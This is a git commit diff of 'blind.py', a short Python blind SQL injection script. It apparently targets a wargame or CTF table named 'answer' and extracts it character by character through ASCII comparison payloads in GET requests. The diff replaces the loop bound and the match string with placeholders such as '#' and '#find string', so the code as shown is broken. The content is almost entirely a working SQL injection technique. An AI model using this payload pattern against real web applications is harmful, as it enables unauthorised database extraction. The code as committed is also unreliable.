9317d5b537a832b961767b760f2e747154db5171
CHOI-JINHO04 <57424137+CHOI-JINHO04@users.noreply.github.com>
2020-08-17 19:14:44 +0900

    Update blind.py

--- blind.py
+++ blind.py
@@ -10,14 +10,14 @@ import re
 s = []
 url1 = "http://"
 headers = {'cookie':'}
-for i in range(1,5):
-	for j in range(33,127):
+for i in range(1,#):
+	for j in range(33,127):  #ascii
 		url2 = "%'and(ascii(substr((SELECT*from answer),"+str(i)+",1))="+str(j)+")and'1%'='1"
 		#data = {"user_name":"%' and (ascii(substr((SELECT * from answer),"+str(i)+",1)) = "+str(j)+") and '1%'='1"}
 		fi_url = url1+url2
 		req = requests.get(url=fi_url,headers=headers)
 		response = req.text
-		f = re.findall("2019-08-20", response)
+		f = re.findall(#find string", response)
 		if (f):
 			print (chr(j))
 			s.append(chr(j))
